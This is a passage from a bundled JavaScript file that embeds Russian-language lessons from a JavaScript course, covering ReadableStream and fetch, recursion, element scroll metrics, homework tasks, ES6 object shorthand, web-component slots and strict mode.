(chank) {\n    this.appendChild(document.createElement('p'))\n      .textContent = chank\n}\n~~~~\n\n^^Для считывания данных из потока объявим функцию **~readStream~**^^\n^^Функция **~readStream~** будет получать два аргумента: ссылку на поток и ссылку на контейнер для вывода данных^^\n^^Используем метод **~getReader()~** объекта класса ~ReadableStream~^^\n^^Этот метод вызвращает объект^^\n\n~~~~js\nfunction readStream (stream, container) {\n  const reader = stream.getReader()\n  reader\n    .read()\n    .then(function getChank ({ done, value }) {\n      if (done) return\n      container.putChank(value)\n      return reader.read().then(getChank)\n    })\n}\n~~~~\n\n^^Недостаток: В этом случае вложенные вызовы могут привести к переполнению стека^^\n\n[![ico-70 youtube]](https://youtu.be/hZJByg_KcX4)\n\n^^Однако если использовать асинхронную функцию для чтения данных из потока:^^\n\n~~~js\nasync function readStream (stream, container) {\n  const reader = stream.getReader()\n  do {\n    var { done, value } = await reader.read()\n    container.putChank(done ? '' : value)\n  } while (!done)\n}\n~~~\n\n^^то вложенных вызовов не будет, и переполнение стека нам не грозит, в чем можно убедиться на видео^^\n\n[![ico-70 youtube]](https://youtu.be/OJOOBgqbsmk)\n\n_______________________________________________\n\n![ico-25 cap] ** 3**\n\n^^Создадим поток **~stream~**, который заполняется ссылками на аватарки юзеров гитхаба^^\n\n~~~~js\nconst stream = new ReadableStream({\n  start (controller) {\n    let num = 70, end = 80\n    while (num < end) {\n      fetch(`https://api.github.com/users/${num++}`)\n        .then(response => response.json())\n        .then(user => controller.enqueue(user.avatar_url))\n    }\n  }\n})\n~~~~\n\n^^Объявим асинхронную функцию для чтения данных из потока:^^\n\n~~~~js\nasync function readStream (stream, container) {\n  const reader = stream.getReader()\n  do {\n    var { done, value } = await reader.read()\n    !done && container.pushUser(value)\n  } while (!done)\n}\n~~~~\n\n^^Создадим контейнер для вывода аватарок:^^\n\n~~~~js\nconst avatars = document.body\n  .appendChild(document.createElement('section'))\n\navatars.pushUser = function (chank) {\n  this.appendChild(document.createElement('img')).src = chank\n}\n~~~~\n\n^^Осталось только вызвать readStream ():^^\n\n~~~js\nreadStream(stream, avatars)\n~~~\n\n____________________________________________\n\n## ![ico-25 icon] fetch\n\nМетод fetch возвращает промис, который резолвится объектом класса **~Response~**, свойство **_~body~_** которого является объектом класса **~ReadableStream~**\n\n![ico-25 cap] ** 4**\n\n~~~js\nfetch('http://ptsv2.com/t/garevna/d/980001/json')\n  .then(response => console.log(response.body))\n~~~\n\n^^^[Результат]\n\n~~~console\n▼ ReadableStream {}\n    locked: (...)\n  ▼ __proto__:\n      ► cancel: ƒ cancel()\n      ► constructor: ƒ ReadableStream()\n      ► getReader: ƒ getReader()\n        locked: (...)\n      ► pipeThrough: ƒ pipeThrough()\n      ► pipeTo: ƒ pipeTo()\n      ► tee: ƒ tee()\n      ► get locked: ƒ locked()\n      ► __proto__: Object\n~~~\n\n^^^\n\nМы можем использовать метод **_~getReader~_** для получения дефолтного ридера этого объекта\n\n~~~js\nfetch('http://ptsv2.com/t/garevna/d/980001/json')\n  .then(response => console.log(response.body.getReader()))\n~~~\n\n^^^[Результат]\n\n~~~console\n▼ ReadableStreamDefaultReader {}\n    closed: (...)\n  ▼ __proto__:\n      ► cancel: ƒ cancel()\n        closed: (...)\n      ► constructor: ƒ ReadableStreamDefaultReader()\n      ► read: ƒ read()\n      ► releaseLock: ƒ releaseLock()\n      ► get closed: ƒ closed()\n      ► __proto__: Object\n~~~\n\n^^^\n\nМы уже знаем, что метод **_~read()~_** объекта _~ReadableStreamDefaultReader~_ возвращает промис\n\n~~~js\nfetch('http://ptsv2.com/t/garevna/d/980001/json')\n  .then(response => response.body.getReader().read())\n  .then(response => console.log(response))\n~~~\n\n^^^[Результат]\n\n~~~console\n▼ {value: Uint8Array(1401), done: false}\n    done: false\n  ► value: Uint8Array(1401) [123, 34, 84, 105, 109, 101, 115, 116, 97, 109, 112, 34, 58, 34, 50, 48, 49, 56, 45, 49, 48, 45, 50, 52, 84, 48, 55, 58, 48, 52, 58, 49, 56, 46, 48, 57, 51, 49, 90, 34, 44, 34, 77, 101, 116, 104, 111, 100, 34, 58, 34, 80, 79, 83, 84, 34, 44, 34, 82, 101, 109, 111, 116, 101, 65, 100, 100, 114, 34, 58, 34, 49, 56, 53, 46, 51, 56, 46, 50, 49, 55, 46, 54, 57, 34, 44, 34, 73, 68, 34, 58, 57, 56, 48, 48, 48, 49, 44, 34, 72, …]\n  ► __proto__: Object\n~~~\n\n^^^\n\nПо дефолту этот промис разрезолвится объектом класса **~ArrayBuffer~**\n\n**~ArrayBuffer~** - это конструктор, поэтому мы можем и сами создавать экземпляры класса **~ArrayBuffer~**\n\n~~~~js\nfetch('http://ptsv2.com/t/garevna/d/980001/json')\n  .then(response => response.body.getReader().read())\n  .then(response => {\n    const buffer = new ArrayBuffer(response.value.length)\n    response.value\n      .forEach((val, index) => { buffer[index] = val })\n    console.log(buffer)\n  }))\n~~~~\n\n^^^[Результат]\n\n~~~console\nArrayBuffer(1401) {0: 123, 1: 34, 2: 84, 3: 105, 4: 109, 5: 101, 6: 115, 7: 116, 8: 97, 9: 109, 10: 112, 11: 34, 12: 58, 13: 34, 14: 50, 15: 48, 16: 49, 17: 56, 18: 45, 19: 49, 20: 48, 21: 45, 22: 50, 23: 52, 24: 84, 25: 48, 26: 55, 27: 58, 28: 48, 29: 52, 30: 58, 31: 49, 32: 56, 33: 46, 34: 48, 35: 57, 36: 51, 37: 49, 38: 90, 39: 34, 40: 44, 41: 34, 42: 77, 43: 101, 44: 116, 45: 104, 46: 111, 47: 100, 48: 34, 49: 58, 50: 34, 51: 80, 52: 79, 53: 83, 54: 84, 55: 34, 56: 44, 57: 34, 58: 82, 59: 101, 60: 109, 61: 111, 62: 116, 63: 101, 64: 65, 65: 100, 66: 100, 67: 114, 68: 34, 69: 58, 70: 34, 71: 49, 72: 56, 73: 53, 74: 46, 75: 51, 76: 56, 77: 46, 78: 50, 79: 49, 80: 55, 81: 46, 82: 54, 83: 57, 84: 34, 85: 44, 86: 34, 87: 73, 88: 68, 89: 34, 90: 58, 91: 57, 92: 56, 93: 48, 94: 48, 95: 48, 96: 49, 97: 44, 98: 34, 99: 72, …}\n~~~\n\n^^^\n\nОбъект класса **~ArrayBuffer~** всегда можно превратить в экземпляр класса **~Blob~**\n\n~~~~js\nfetch('http://ptsv2.com/t/garevna/d/980001/json')\n  .then(response => {\n    console.log(response.body)\n    response.body\n      .getReader()\n      .read()\n        .then(response => {\n          const buffer = new ArrayBuffer(response.value.length)\n          response.value\n            .forEach((val, index) => { buffer[index] = val })\n          const blob = new Blob([buffer])\n          console.log(blob)\n        })\n   })\n~~~~\n\n^^^[Результат]\n\n~~~console\n▼ Blob(1401) {size: 1401, type: \"\"}\n    size: 1401\n    type: \"\"\n    __proto__: Blob\n~~~\n\n^^^\n\nпоскольку **~Blob~** - это тоже конструктор:\n\n~~~~js\nconst blob = new Blob(['body { background-color: #dde; }' ], { type: 'text/css' })\nconst link = document.createElement('link')\nlink.rel = 'stylesheet'\nlink.href = window.URL.createObjectURL(blob)\ndocument.body.appendChild(link)\n~~~~\n"},94056:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Рекурсия\n\nРекурсия - это процесс, в котором функция вызывает сама себя, прямо или косвенно\n\nРекурсивная функция в функциональном программировании является более \"чистой\" альтернативой циклу\n\n![ico-20 warn] Каждая рекурсивная функция должна иметь условие прерывания рекурсии\nВ противном случае вызов функции приведет к бесконечному циклу\n\n**Хвостовая рекурсия** - это когда последним исполняемым оператором рекурсивной функции будет оператор  **_return_** с вызовом этой же функции\n\nПростейший ( классический ) пример рекурсии - вычисление факториала\n\n^^^[Вычисление факториала]\n\n![ico-25 cap] ** 1**\n\n~~~js\nfunction factorial (num, result) {\n  result = (!result ? 1 : res) * num--\n  return num < 2 ? result : factorial(num, result)\n}\n~~~\n\n![ico-25 cap] ** 2**\n\n~~~js\nfunction factorial (n, result = 1) {\n  result *= n--\n  return n < 2 ? result : factorial(n, result)\n}\n~~~\n\n![ico-25 cap] ** 3**\n\n~~~js\nfunction factorial (n, result) {\n  while (n > 1)\n    return factorial(n - 1, n * (!result ? 1 : result))\n  return result\n}\n~~~\n\n![ico-25 cap] ** 4**\n\n~~~js\nfunction factorial (n, result = 1) {\n  return n < 2 ? result : factorial(n - 1, n * result)\n}\n~~~\n\n^^^\n\nДля того, чтобы избавиться от опционального параметра, используем замыкание:\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nfunction factor (num) {\n  var res = 1\n  return (function fact () {\n    res *= num\n    return num < 2 ? res : fact (--num)\n  })()\n}\n~~~\n\nВ JavaScript каждый вызов функции добавит кадр вызова в стек\n\nКогда вызов завершается, кадр удаляется из стека\n\nОднако рекурсивная функция не завершается сразу\n\nОна вернет рекурсивный вызов самой себя\n\n[![ico-70 youtube]](https://www.youtube.com/watch?time_continue=2&v=nbqLBlanSMk)\n\nЕсли хвостовая рекурсия достаточно глубокая, это может привести к переполнению стека и генерации исключения ![ico-20 err] **~RangeError~**\n^^Исключение **~RangeError~** возникает тогда, когда глубина рекурсии превышает 10000^^\n\n## ![ico-25 hw] Упражнение\n\nРазберите код функции **circle**\n\n~~~js\nvar circle = function (radius) {\n  var elem = document.createElement('div')\n        document.body.appendChild ( elem )\n        elem.style = `\n             position: absolute;\n             width: ${radius}px;\n             height: ${radius}px;\n             border-radius: 50%;\n             border: solid 1px green;\n        `\n        if ( radius < 300 ) circle ( radius += 20 )\n}\n~~~\nВызовите функцию **circle**\n\n____________________________\n\n[![ico-30 hw] **Тесты**](https://garevna.github.io/js-quiz/#recursion)\n"},14315:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='## ![ico-25 icon] Размеры и прокрутка элемента\n\n| **Свойство**       |          | Значение (**в пикселях**)                                   |\n| **~scrollHeight~** | readonly | полная высота элемента                                      |\n| **~scrollWidth~**  | readonly | полная ширина элемента                                      |\n| **~clientHeight~** | readonly | высота видимой части элемента (за вычетом полосы прокрутки) |\n| **~clientWidth~**  | readonly | ширина видимой части элемента (за вычетом полосы прокрутки) |\n| **~offsetHeight~** | ^^readonly^^ | высота элемента (включая границы, отступы и горизонтальные полосы прокрутки). Если элемент скрыт (style.display: none), то возвращается 0. |\n| **~offsetWidth~**  | readonly | ширина видимой части элемента (с учетом полосы прокрутки)   |\n| **~scrollTop~**    | readonly | высота "прокрученной" части элемента (сверху)               |\n| **~scrollLeft~**   | readonly | ширина "прокрученной" части элемента (слева)                |\n\n### ![ico-20 icon] **scrollHeight**\n\nполная высота элемента\n\n### ![ico-20 icon] **scrollWidth**\n\nполная ширина элемента\n\n### ![ico-20 icon] **clientHeight**\n\nвысота видимой части элемента ( за вычетом полосы прокрутки )\n\n### ![ico-20 icon] **clientWidth**\n\nширина видимой части элемента ( за вычетом полосы прокрутки )\n\n\n### ![ico-20 icon] offsetHeight\n\n{{{offset-height.js}}}\n\n\n### ![ico-20 icon] **offsetWidth**\n\nширина видимой части элемента (с учетом полосы прокрутки)\n\n{{{offset-left.js}}}\n\n### ![ico-20 icon] **scrollTop**\n\nвысота "прокрученной" части элемента ( сверху )\n\n### ![ico-20 icon] **scrollLeft**\n\nширина "прокрученной" части элемента ( слева )\n\n_____________________________________\n\n[:::Пример 1:::](https://garevna.github.io/js-samples/chanks/scroll.html)\n\n_____________________________________\n\n### ![ico-30 hw] Упражнение\n\nВыполните код в консоли\n\n~~~~js\nconst section = document.body\n\nsection.style = `\n    background: #000;\n    margin: 0;\n    padding: 0;\n    overflow: hidden;\n`\n\nlet rect = null\nlet aside = section.appendChild (\n    document.createElement ( "aside" )\n)\naside.style = `\n    position: absolute;\n    left: 10px;\n    bottom: 10px;\n    height: max-content;\n    width: max-content;\n    font-family: Arial;\n    font-size: 0.7rem;\n    color: #abc;\n`;\n\nconst figure = document.body.appendChild (\n    document.createElement ( "figure" )\n)\nfigure.style = `\n    position: absolute;\n    top: 50px;\n    left: 50px;\n    bottom: 50px;\n    right: 50px;\n    transition: all 0.5s ease;\n    background: #ffffff50;\n    border: solid 1px #fff;\n    z-index: 1;\n`;\n\nconst addRect = ( top, left, height, width ) => {\n    rect = section.appendChild (\n        document.createElement ( "div" )\n    )\n    rect.style = `\n        position: absolute;\n        top: ${top}px;\n        left: ${left}px;\n        width: ${width}px;\n        height: ${height}px;\n        border: dotted 1px #789;\n        z-index: 0;\n    `\n    return rect\n}\n\nlet metrics = [\n    "offsetTop", "offsetLeft",\n    "offsetHeight", "offsetWidth",\n    "scrollHeight", "scrollWidth"\n];\n\nconst randomVal = val => Math.max ( section.offsetHeight / 16, Math.round ( Math.random() * val ) )\nconst changeSize = () => {\n    figure.style.top = figure.style.bottom = randomVal ( section.offsetHeight / 3 ) + "px"\n    figure.style.left = randomVal ( section.offsetWidth / 3 ) + 100 + "px"\n    figure.style.right = randomVal ( section.offsetWidth / 3 ) + "px"\n\n}\n\nconst movie = () => requestAnimationFrame ( function () {\n    changeSize ()\n    aside.innerHTML = ""\n    rect ? rect.remove() : null\n    rect = addRect (\n        figure.offsetTop,\n        figure.offsetLeft,\n        figure.offsetHeight,\n        figure.offsetWidth\n    )\n    requestAnimationFrame (\n        () => metrics.forEach ( item => aside.innerHTML += `<p>${item}: ${figure[item]}</p>` )\n    )\n})\n\nsection.onclick = movie\n~~~~\n\n{{{scroll-1.js}}}\n\n__________________________________________________\n\n## ![ico-20 icon] getBoundingClientRect()\n\nВсе элементы DOM наследуют от ~Element~\n\nУ объекта ~Element._prototype_~ есть метод **~getBoundingClientRect()~**\n\n\nМетод возвращает объект класса ~DOMRect~\n\nКоординаты ~top~, ~left~, ~bottom~, ~right~ элемента определяются относительно верхнего левого угла viewport\nПри прокрутке страницы эти координаты изменяются\n\n~~~js\ndocument.querySelector ( "p" )\n    .getBoundingClientRect()\n~~~\n\n~~~console\n▼ DOMRect {x: 166.5, y: -2905, width: 520, height: 100, top: -2905, …}\n    bottom: -2805\n    height: 100\n    left: 166.5\n    right: 686.5\n    top: -2905\n    width: 520\n    x: 166.5\n    y: -2905\n  ► __proto__: DOMRect\n~~~\n\n[:::Пример 2:::](https://garevna.github.io/js-samples/chanks/getBoundingClientRect.html)\n'},77951:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='## ![ico-25 hw] Задание 1\n\nСоздать массив **group**, элементы которого будут объектами, содержащими данные каждого студента группы\n\nКакие данные - на ваше усмотрение ( например, имя, фамилия, возраст, наличие ноутбука и т.д. )\n\n~~~javascript\nvar group = [\n  {\n    name: "...",\n    lastName: "...",\n    age: ...,\n    notebook: false,\n    ...\n]\n~~~\n\nСоздать функцию, которая итерирует массив **group**, выводя в консоль данные каждого студента одной строкой\n\n( предварительно преобразовав объект в строку, не забудьте сивол-разделитель )\n\n~~~javascript\nfunction getStudentsList ( arrayOfStudents ) {\n    ...\n}\n~~~\n\n^^Можно вернуть новый массив ( массив строк, а не объектов )  и вывести его в консоль^^\n\n_________________________________________________\n\n## ![ico-25 hw] Задание 2\n\nРабота с предыдущим массивом **group**\n\nОбъявить функцию, которая добавляет нового студента в массив **group**\nФормальные параметры - данные студента\n\n~~~javascript\nfunction addNewStudent ( name, lastName, age, notebook ... ) {\n    ...\n}\n~~~\n\nВызвать функцию **addNewStudent**, передав ей фактические данные нового студента\nПосле этого вызвать предыдущую функцию ( **getStudentsList** ), чтобы убедиться, что студент добавлен в группу\n\n________________________________________\n\n## ![ico-25 hw] Задание 3\n\nОбъявить функцию, которая получает в качестве аргумента строку и удаляет из нее символы, код которых  больше **1103** или меньше **1040**\nФункция должна вернуть новую строку\nПрименить эту функцию к строке  \n~"Вчbvnера 789 был home work наiuyстоtящий + празrorднgfdик"~\n\n________________________________________\n\n## ![ico-25 hw] Задание 4\n\nНаписать функцию сортировки массива\n\n![ico-20 warn] Не использовать метод ~sort()~\n![ico-20 warn] Использовать оператор цикла  ~while~\n![ico-20 warn] Использовать методы работы с массивами и строками\n\n________________________________________\n\n## ![ico-25 hw] Задание 5\n\nЕсть два массива, в первом - имена, во втором - фамилии\nНужно создать массив, элементы которого будут содержать имя и фамилию одной строкой\n\n~~~javascript\nnames [ i ] ="Сергей",\nlastNames [ i ] = "Коломенцев"\n~~~\n\n**Результат:**\n\n~~~javascript\nnewArray [ i ] = "Сергей Коломенцев"\n~~~\n'},576:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Краткая форма объявления методов\n\n**ES6**\n\n______________________________________________________\n\n![ico-25 icon] Краткий синтаксис объявления методов при инициализации объекта:\n\n~~~js\nvar user = {\n    name: "Ivan",\n    sayHello () {\n        console.log ( `Hello, ${ this.name }!` )\n    },\n    sayBye () {\n        console.log ( `Bye, ${ this.name }!` )\n    }\n}\nuser.sayHello ()\nuser.sayBye ()\n~~~\n\n![ico-20 warning] Вместо \n\n~~~js\nsayHello: function () {\n    console.log ( `Hello, ${ this.name }!` )\n}\n~~~\n\nможно использовать краткую форму: \n\n~~~js\nsayHello () {\n    console.log ( `Hello, ${ this.name }!` )\n}\n~~~\n\n![ico-20 warning] Краткий синтаксис допускает вычисляемые имена свойств\n\n~~~js\nvar bag = {\n    [ "thing" + 0 ]: "👜",\n    thing1: function () { return \'🌹\' },\n    thing2 () { return "🌸" },\n    [ "thing" + 3 ] () { return "🍄" },\n}\nconsole.log ( bag.thing0 )\nconsole.log ( bag.thing1 () )\nconsole.log ( bag.thing2 () )\nconsole.log ( bag.thing3 () )\n~~~'},66721:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Краткая форма литерала объекта\n\n**ES6**\n________________________________________________\n\n![ico-25 cap] **Пример 1**\n\n~~~js\nlet name = "Ivan", age = 25\nlet user = { name, age }\n\nconsole.log ( user )\n~~~\n\n**console**\n\n~~~console\n\n► { name: "Ivan", age: 25 }\n~~~\n\n![ico-25 cap] **Пример 2**\n\nНе забывайте, что массивы и объекты передаются по ссылке\n\n~~~js\nlet name = "Ivan", age = 25\nlet hobby = [ "football", "fishing" ],\n    family = {\n        mother: { name: "Mary", age: 50 },\n        father: { name: "Stephan", age: 52 }\n    }\n\nlet user = { name, age, hobby, family }\n\nhobby.push ( "maps" )\nfamily.sister = { name: "Helen", age: 20 }\n\nconsole.log ( user )\n~~~\n\n**console**\n\n~~~console\n\n▼ { name: "Ivan", age: 25, hobby: Array(3), family: {…} }\n    age: 25\n  ▼ family:\n      ► father: {name: "Stephan", age: 52}\n      ► mother: {name: "Mary", age: 50}\n      ► sister: {name: "Helen", age: 20}\n      ► __proto__: Object\n  ► hobby: (3) ["football", "fishing", "maps"]\n    name: "Ivan"\n  ► __proto__: Object\n~~~'},37657:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] slot\n\n## ![ico-25 icon]\n\nКлассная фича, которая позволяет динамически изменять контент элемента\n\n![ico-20 warn] Поддержка в браузерах еще не полная, **Edge** пока догоняет вечнозеленые\n\n### ![ico-25 cap] Пример с именованным слотом\n\nЗдесь все элементарно:\n\nВ шаблоне разметки мы вставим именованный слот:\n\n~~~html\n<slot name=\"script\">Default script</slot>\n~~~\n\nВставим шаблон со слотом в DOM:\n\n~~~javascript\nconst template = document.body.appendChild (\n    document.createElement ( \"template\" )\n)\n\ntemplate.innerHTML = `\n    <style>\n        .code { color: magenta; }\n        .div { border: inset 1px; padding: 10px 20px; }\n    </style>\n    <div class=\"div\">\n        <p class=\"code\"><slot name=\"script\">Default script</slot></p>\n    </div>\n`\n~~~\n\nТеперь можно динамически изменять текст внутри слота\n\nДавайте для начала создадим кастомный элемент **~sample-element~** с этим шаблоном разметки:\n\n~~~js\ncustomElements.define('sample-element', class extends HTMLElement {\n  constructor() {\n    super()\n\n    this.attachShadow({ mode: 'open' })\n      .appendChild(template.content.cloneNode(true))\n  }\n})\n~~~\n\nСоздадим переменную **_~codeText~_**, в которой будем хранить текст для вставки:\n\n~~~js\nconst codeText = `function sayHello () { console.log('Hello!') }`\n~~~\n\nТеперь можно вставлять кастомный элемент на страницу с заданным контентом:\n\n~~~js\ndocument.body\n  .appendChild(document.createElement('sample-element'))\n  .appendChild((text => Object.assign(document.createElement('pre'), {\n    slot: 'script',\n    innerText: text\n  }))(codeText))\n~~~\n\nВот и все!\n\n___________________________________________________________\n\nПолный код сниппета:\n\n~~~~js\nconst template = document.body\n  .appendChild(document.createElement('template'))\n\ntemplate.innerHTML = `\n  <style>\n    .code { color: magenta; }\n    .div { border: inset 1px; padding: 10px 20px; }\n  </style>\n  <div class=\"div\">\n    <p class=\"code\">\n      <slot name=\"script\">\n        Default script\n      </slot>\n    </p>\n  </div>\n`\n\ncustomElements.define('sample-element', class extends HTMLElement {\n  constructor() {\n    super()\n\n    this.attachShadow({ mode: 'open' })\n      .appendChild(template.content.cloneNode(true))\n  }\n})\n\nconst codeText = `function () { console.log('Hello!') }`\n\ndocument.body\n  .appendChild(document.createElement('sample-element'))\n  .appendChild((text => Object.assign(document.createElement('pre'), {\n    slot: 'script',\n    innerText: text\n  }))(codeText))\n~~~~\n\n_____________________________________________________________________\n\n[![ico-25 cap] ** 2**](https://repl.it/@garevna/web-component)\n"},25306:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 icon] JS\n\n### ![ico-20 question] OOP\n\nСтрого говоря, **JS** незьзя назвать объектно-ориентированным языком в силу нарушения некоторых базовых принципов ООП. Прототипную модель наследования скорее можно назвать моделью делегирования, поскольку наследования в полном смысле этого слова не происходит.\n\n☼☼☼ В JS рулят функции, а не классы ☼☼☼.\n\n### ![ico-20 question] Полиморфизм\n\nЕсли вы хотите почувствовать настоящий **полиморфизм**, то вам нужен JS.\nЗдесь полиморфизм начинается с самого первого шага.\nВ JavaScript полиморфизм проявляется через различные механизмы, такие как перезагрузка функций, прототипное наследование, динамическая типизация. Эти фичи делают JS таким мощным и невероятно гибким инструментом разработки.\n\nОт этого иногда сносит крышу!\nМногим кажется таким запутанным и сложным неявное приведение типов, потому что они не знают, что движок и здесь дает вам возможность управлять этим процессом.\n\nТак что "Прощай, классовая модель наследования!", да здравствует\n☼☼☼ функциональная свобода JS! ☼☼☼\n\n### ![ico-20 icon] Функциональщина\n\n@@@@\n**JS** включает множество обалденных фич (такие как _цепочные вычисления_, _каррирование_) из **функциональных языков программирования**.<br><br>Более того, функциональщина является базой асинхронщины в JS.\n![](images/funcs-are-our-jam.svg)\n\n@@@@\n\n**Асинхронщина** базируется на колбеках, т.е. **_функциях_**.\nКороче, JS держится на функциях, и это не просто принцип выполнения отдельных задач, а, скорее, форма существования языка, его истинная сущность. Главные особенности языка - прототипная модель наследования и асинхронность - реализованы посредством функций.\n\n### ![ico-20 icon] Jazz\n\n☼☼☼ JS - это джаз, импровизация, фантастическая свобода ☼☼☼\n\nНо свобода неотделима от ответственности.\n\nОчень важно понимать, как движок интерпретирует каждую строчку вашего кода.\nДвижок очень мощный, поэтому сажать за руль HMMWV человека, не умеющего водить — полное безумие.\n\n@@@@\n\n![](images/F-35.jpg)\nЕще хуже — позволить новичку «рулить» F35.<br><br>Ныряйте, ребята! С настойчивостью и терпением.\n☼☼☼ Удачного полета с JS! ☼☼☼\n@@@@\n'},11911:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] strict mode\n\n~~~js\n'use strict'\n~~~\n\nЭто директива для интерпретатора\n\nДиректива ~'use strict'~ распознается только в начале скрипта или функции\n\n~~~js\nfunction sample () {\n  'use strict'\n  ...\n}\n~~~\n\nДиректива ~'use strict'~ переводит выполнение скрипта в строгий режим ( **~strict mode~** )\n\n________________________________________________\n\n## ![ico-25 error] В строгом режиме нельзя:\n\n\n### ![ico-20 warn] использовать необъявленные переменные \n\n~~~js\n'use strict'\n\nx = 8\n~~~\n\nбудет сгенерировано исключение: \n\n••![ico-20 error] Uncaught ReferenceError: x is not defined••\n\n^^^[Memory leaks]\n\nИ это хорошо, поскольку позволяет избежать утечек памяти\n\"Сборщики мусора\" ( garbage collectors ) никогда не \"выметают\" ( sweep ) глобальные переменные\nНапример, если по забывчивости сделать так:\n\n~~~js\nfunction sample () {\n  someText = 'This is a memory leak'\n}\n~~~\n\nто в обычном ( нестрогом ) режиме будет создана переменная ~someText~ в глобальной области видимости\n\n^^Иногда глобальные переменные необходимы для обеспечения доступа к данным из различных частей приложения^^\n^^В таком случае не забывайте обнулять значение таких переменных, если хранимые в них данные больше не нужны^^\n\n^^^\n\n_________________________________\n\n### ![ico-20 warn] удалять переменные и функции оператором  delete\n\n**обычный режим:**\n\n~~~js\nfunction sum (x, y) {\n  return x + y\n}\n\ndelete sum   // false\n~~~\n\n**строгий режим:**\n\n~~~js\n'use strict'\n\nfunction sum (x, y) {\n  return x + y\n}\n\ndelete sum\n~~~\n\n**будет сгенерировано исключение:**\n\n••![ico-20 error] Uncaught SyntaxError: Delete of an unqualified identifier in strict mode.••\n\n________________________________________________\n\n### ![ico-20 warn] присваивать восьмеричные значения\n\n**обычный режим:**\n\n~~~js\nvar x = 010   // 8\n~~~\n\n**строгий режим:**\n\n~~~js\n'use strict'\n\nvar x = 010\n~~~\n\n**будет сгенерировано исключение:**\n\n••![ico-20 error] Uncaught SyntaxError: Octal literals are not allowed in strict mode.••\n\n__________________________________________________\n\n### ![ico-20 warn] использовать экранированные восьмеричные значения\n\n**обычный режим:**\n\n~~~js\nvar x = '\\010'   // \"\"\n~~~\n\n**строгий режим:**\n\n~~~js\n'use strict'\n\nvar x = '\\010'\n~~~\n\n**будет сгенерировано исключение:**\n\n••![ico-20 error] Uncaught SyntaxError: Octal escape sequences are not allowed in strict mode.••\n\n_________________________________________\n\n### ![ico-20 warn] изменять значения неперезаписываемых свойств\n\n**обычный режим:**\n\n~~~js\nvar sample = Object.defineProperty({}, 'x', {\n  value:0,\n  writable:false\n})\n\nsample.x = 5   // 0\n~~~\n\n**строгий режим:**\n\n~~~js\n'use strict'\n\nvar sample = Object.defineProperty({}, 'x', {\n  value:0,\n  writable:false\n})\n\nsample.x = 5\n~~~\n\n**будет сгенерировано исключение:**\n\n••![ico-20 error] Uncaught TypeError: Cannot assign to read only property 'x' of object '#&lt;Object>'••\n\n________________________________________________\n\n### ![ico-20 warn] изменять значения свойств с геттером ( без сеттера )\n\n**обычный режим:**\n\n~~~js\nvar obj = { \n  get x () {\n    return 0\n  } \n}\n\nobj.x = 5 // 0\n~~~\n\n**строгий режим:**\n\n~~~js\n'use strict'\n\nvar obj = { \n  get x () {\n    return 0\n  } \n}\n\nobj.x = 5\n~~~\n\n**будет сгенерировано исключение:**\n\n••![ico-20 error] Uncaught TypeError: Cannot set property x of #<Object> which has only a getter••\n\n_________________________________________________\n\n### ![ico-20 warn] удалять неудаляемые свойства\n\n**обычный режим:**\n\n~~~js\ndelete Object.prototype  // false\n~~~\n\n**строгий режим:**\n\n~~~js\n'use strict'\n\ndelete Object.prototype\n~~~\n\n**будет сгенерировано исключение:**\n\n••![ico-20 error] Uncaught TypeError: Cannot delete property 'prototype' of function Object() { [native code] }••\n\n_______________________________________________\n\n### ![ico-20 warn] использовать **_eval_** как имя переменной\n\n**обычный режим:**\n\n~~~js\nvar eval = 7  // 7\n~~~\n\n**строгий режим:**\n\n~~~js\n'use strict'\n\nvar eval = 7\n~~~\n\n**будет сгенерировано исключение:**\n\n••![ico-20 error] Uncaught SyntaxError: Unexpected eval or arguments in strict mode••\n\n_______________________________________\n\n### ![ico-20 warn] использовать **_arguments_** как имя переменной\n\n**обычный режим:**\n\n~~~js\nvar arguments = 7  // 7\n~~~\n\n**строгий режим:**\n\n~~~js\n'use strict'\n\nvar arguments = 7\n~~~\n\n**будет сгенерировано исключение:**\n\n••![ico-20 error] Uncaught SyntaxError: Unexpected eval or arguments in strict mode••\n\n_____________________________________________\n\n### ![ico-20 warn] использовать **_arguments.callee_**\n\n**обычный режим:**\n\n~~~js\nfunction test () {\n  console.log(arguments.callee)\n}\n\ntest ()\n~~~\n\n**Результат в консоли:**\n\n~~~console\n\nƒ test () {\n  console.log(arguments.callee)\n}\n~~~\n\n**строгий режим:**\n\n~~~js\n'use strict'\n\nfunction test () {\n  console.log(arguments.callee)\n}\n\ntest ()\n~~~\n\n**будет сгенерировано исключение:**\n\n![ico-20 error] ~~~console\n  \nUncaught TypeError: 'caller', 'callee', and 'arguments' properties \nmay not be accessed on strict mode functions or the arguments objects for calls to them\n~~~\n\n_________________________________________\n\n### ![ico-20 warn] использовать свойство **_caller_**\n\n**обычный режим:**\n\n~~~js\nfunction test () {\n  (function () {\n    console.log(arguments.callee.caller)\n  })()\n}\n\ntest ()\n~~~\n\n**Результат в консоли:**\n\n~~~console\n\nƒ test () {\n  (function () {\n    console.log(arguments.callee.caller)\n  })()\n}\n~~~\n\n**строгий режим:**\n\n~~~js\n'use strict'\n\nfunction test () {\n  (function () {\n    console.log(arguments.callee.caller)\n  })()\n}\n\ntest ()\n~~~\n\n**будет сгенерировано исключение:**\n\n~~~console\n  \n⛔️ Uncaught TypeError:\n'caller', 'callee', and 'arguments' properties \nmay not be accessed on strict mode functions \nor the arguments objects for calls to them\n~~~\n\n___________________________________\n\n### ![ico-20 warn] использовать выражение _**with**_ \n\n**обычный режим:**\n\n~~~js\nvar x, y\n\nwith (String) {\n  x = fromCharCode(89, 75)\n}\n  \nconsole.log(x)  // \"YK\"\n\nwith (Math) {\n  y = round(x = random() * 1000)\n}\nconsole.log(y)  // 256\n~~~\n\n**строгий режим:**\n\n~~~js\n'use strict'\n\nvar x, y\n\nwith (String) {\n  x = fromCharCode(89, 75)\n}\n  \nconsole.log(x)\n\nwith (Math) {\n  y = round(x = random() * 